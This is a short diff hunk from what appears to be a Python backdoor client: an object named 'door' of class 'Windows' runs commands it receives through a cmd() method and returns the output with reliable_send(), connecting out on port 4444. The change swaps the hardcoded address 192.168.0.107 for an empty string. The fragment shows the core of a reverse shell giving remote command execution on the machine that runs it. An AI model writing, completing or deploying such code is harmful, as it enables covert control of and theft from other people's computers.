@@ -76,5 +76,5 @@ class Windows:
                 result = self.cmd(" ".join(command))
             self.reliable_send(result)
 
-door = Windows("192.168.0.107", 4444)
+door = Windows("", 4444)
 door.run()
